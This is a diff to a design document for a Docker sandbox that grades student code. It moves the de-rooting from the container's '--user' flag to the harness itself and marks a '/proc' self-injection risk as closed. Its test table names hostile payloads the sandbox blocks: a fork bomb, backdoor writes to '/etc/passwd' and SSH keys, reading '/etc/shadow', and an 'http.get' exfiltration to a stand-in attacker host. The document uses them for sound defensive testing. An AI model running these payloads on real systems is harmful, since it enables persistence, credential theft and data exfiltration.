@@ -89,7 +89,7 @@ uses this exact argv (assembled as an **array, never a shell string** — comman
 ```
 docker run --rm --init --network none --memory 256m --memory-swap 256m --cpus 0.5 \
   --pids-limit 64 --read-only --tmpfs /tmp:rw,noexec,nosuid,size=16m \
-  --cap-drop ALL --security-opt no-new-privileges --user 65534:65534 \
+  --cap-drop ALL --cap-add SETUID --cap-add SETGID --security-opt no-new-privileges \
   -v <tmp>:/work:ro -w /work node:20-alpine node /work/harness.js
 ```
 
@@ -101,10 +101,20 @@ docker run --rm --init --network none --memory 256m --memory-swap 256m --cpus 0.
 | `--pids-limit 64` | **Fork bombs** — the kernel caps the process count (verified: a fork bomb is contained, docker daemon stays responsive). |
 | `--read-only` + `-v …:/work:ro` | Filesystem tampering / persistence (verified: writing to `/work` or `/etc` fails). |
 | `--tmpfs /tmp:…,noexec,nosuid` | Gives a small scratch space that **can't execute** dropped binaries or gain setuid. |
-| `--cap-drop ALL` + `--security-opt no-new-privileges` | Strips Linux capabilities and blocks privilege escalation. |
-| `--user 65534:65534` | Runs as **nobody** — stock alpine images run as root otherwise; this is the flag that actually de-roots the payload. |
+| `--cap-drop ALL` + `--cap-add SETUID` + `--cap-add SETGID` | Strips every Linux capability, then re-adds **only** the two the harness needs to drop the submission's uid itself (see below); `no-new-privileges` still blocks privilege *gain* on execve. |
 | `--init` | tini reaps orphaned/forked grandchildren (PID 1). |
 | `--rm` | The container (and everything a payload did to its own filesystem) is destroyed on exit. |
+
+**PID 1 (tini + `harness.js`) now runs as in-container root** — there is no `--user` flag. This looks like it
+weakens the sandbox, but it does the opposite: it lets the *trusted* harness itself call `setuid(65534)` /
+`setgid(65534)` (via Node's `spawn(..., { uid: 65534, gid: 65534 })`) on **every submission child it spawns**, so
+the untrusted `main.js` still **never** runs as root — it runs at the same unprivileged uid as before, just no
+longer as the *same* uid as PID 1. `no-new-privileges` still holds: it blocks a process from **gaining** privilege
+on `execve` (e.g. via a setuid binary), not a root process **voluntarily dropping** privilege via `setuid()`, which
+is what's happening here. `--cap-drop ALL` still strips everything else; `SETUID`/`SETGID` are the only two
+capabilities added back, and only PID 1 has them — the submission child, running at uid 65534, has none. The
+explicit trade: in-container root for one trusted, dependency-free, code-reviewed file (`harness.js`), in exchange
+for closing the `/proc/1/fd/1` self-injection gap below.
 
 **The grader's own memory is protected separately from the container.** Docker's `--memory` protects the host
 *kernel*; it does nothing for the API's Node heap as it *reads* the container's output. A 100MB stdout flood would
@@ -126,7 +136,7 @@ throughout, and no `verdict-sub-*` container was left behind:
 | `for(;;) child_process.spawn(node…)` — fork bomb | `--pids-limit 64` + process-group kill + `--init`/tini reaping | **host process count never moves**, no leaked container → **FAILED** |
 | Delete/overwrite the grader & write a backdoor (`fs.unlinkSync('/work/harness.js')`, `writeFileSync('/etc/passwd'…)`, `/root/.ssh/authorized_keys`) | `--read-only` + `-v …/work:ro` | every write **blocked — `EROFS` / `EACCES`**; grader files untouched |
 | Exfiltrate the answer key (`http.get('http://attacker…', manifest)`) | `--network none` **and** the answer key is withheld from the container | request can't connect (killed at timeout); the manifest exposes only `{id, input}` — `hasExpectedOutput=false`, so there is **nothing to steal** |
-| De-root / read host secrets (`fs.readFileSync('/etc/shadow')`) | `--user 65534` + `--cap-drop ALL` + `--security-opt no-new-privileges` | runs as **`uid=65534` (nobody)**; `/etc/shadow` → **`EACCES`** |
+| De-root / read host secrets (`fs.readFileSync('/etc/shadow')`) | harness `spawn(..., {uid:65534,gid:65534})` + `--cap-drop ALL` + `--security-opt no-new-privileges` | runs as **`uid=65534` (nobody)**; `/etc/shadow` → **`EACCES`** |
 | Fill the disk (`write 128 MB to /tmp`) | `--tmpfs /tmp:…,size=16m` | write **stops at `ENOSPC`** (~16 MB) |
 | Memory bomb (`Buffer.alloc(10MB)` forever) | `--memory 256m --memory-swap 256m` (zero swap) + per-case timeout | process killed, **host RSS unaffected** → **FAILED** |
 
@@ -185,10 +195,21 @@ DB, every legal one allowed) plus state-machine unit tests — see [Testing](#te
 
 ### 4. Residual risks (honest disclosure)
 
-- **Same-uid `/proc/<pid>/fd` write inside the container.** `main.js` and the harness share uid 65534, so a payload
-  could write to `/proc/1/fd/1` to corrupt/replace *its own* result blob → the submission is marked `ERROR`. It
-  **cannot forge a PASS** (expected outputs are never sent into the container; grading is host-side) and cannot
-  affect other users. Fully closing it needs a distinct in-container uid, hidepid, or gVisor — out of scope here.
+- ~~**Same-uid `/proc/<pid>/fd` write inside the container.**~~ **CLOSED.** `main.js` and the harness (PID 1) used
+  to share uid 65534, so a payload could write to `/proc/1/fd/1` to corrupt/replace *its own* result blob. Fixed by
+  giving them **distinct uids**: PID 1 (tini + `harness.js`) now runs as in-container **root**, with only the
+  `SETUID`/`SETGID` capabilities added back (`--cap-drop ALL --cap-add SETUID --cap-add SETGID`, `--user` removed —
+  see [§1](#1-the-grading-sandbox)), and the harness spawns every submission child via
+  `spawn(main.js, { uid: 65534, gid: 65534 })`. `no-new-privileges` is unaffected (it blocks privilege *gain* on
+  execve, not a root process voluntarily calling `setuid()`). The submission still **never** runs as root — it runs
+  at the exact same unprivileged uid as before, just no longer the *same* uid as PID 1 — so `/proc/1/fd/1` is now
+  owned by a uid the submission doesn't have, and the write fails **`EACCES`/`EPERM`**. The explicit trade: an
+  in-container root PID 1, for one trusted, dependency-free, code-reviewed file. Verified end-to-end (real Docker,
+  no HTTP layer) by `scripts/verify-uid-separation.sh`: (1) the injection attempt is rejected with `EACCES` and the
+  harness's own result stream stays intact for the other cases, (2) the submission child reports `uid=65534` while
+  a same-argv probe confirms PID 1 is `uid=0`, (3) a normal correct solution still grades `PASS` through the
+  identical path, (4) two of the destructive-payload classes above (`/work` write, outbound network) are
+  re-verified still contained at the Docker level.
 - **Hidden test-case *inputs* (not expected outputs) are readable** from the mounted `manifest.json` in the
   one-container-per-submission model — an accepted latency/confidentiality trade-off; the confidentiality that
   matters (expected outputs) is preserved.
@@ -224,6 +245,7 @@ pnpm test                      # 221 unit tests / 29 suites: state machine, reda
                                 # caps, objective grading, verdict/scoring — DB/Docker/network-free (what CI runs)
 bash scripts/abuse-demo.sh          # sandbox evidence artifact (needs the stack up): 7 containment assertions
 bash scripts/verify-destructive.sh  # destructive-payload matrix: fs destruction, key exfil, de-root, disk/mem bombs
+bash scripts/verify-uid-separation.sh  # proves the /proc/1/fd/1 residual is closed (talks to Docker directly)
 # e2e (needs DB, MOCK mode) — currently the happy path (grade -> hidden-case redaction -> doubt -> AI draft ->
 # teacher approval -> visible); a broadened suite covering reject-with-reason, rate-limit 429, input caps,
 # MCQ/INTEGER grading, and feedback regenerate is being added under the same command:
